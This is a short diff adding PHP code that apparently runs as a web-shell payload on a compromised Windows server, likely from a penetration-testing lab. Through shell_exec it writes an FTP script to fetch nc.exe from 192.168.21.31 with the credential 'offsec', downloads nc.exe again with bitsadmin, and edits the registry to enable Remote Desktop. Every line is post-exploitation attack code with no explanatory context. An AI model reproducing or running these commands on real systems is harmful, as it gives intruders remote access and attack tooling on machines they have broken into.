@@ -1,0 +1,17 @@
+echo exec("echo open 192.168.21.31>ftp4.txt");
+echo exec("echo offsec>>ftp4.txt ");
+echo exec("echo ftp>>ftp4.txt");
+echo exec("echo bin>>ftp.txt");
+echo exec("echo get nc.exe>>ftp4.txt");
+echo exec("echo bye>> ftp4.txt");
+
+echo shell_exec("type ftp4.txt");
+
+echo shell_exec("ftp -s:ftp4.txt");
+
+
+echo shell_exec("reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");
+
+
+
+echo shell_exec("bitsadmin /transfer mydownloadjob /download /priority normal http://192.168.21.31/nc.exe c:\nc.exe");
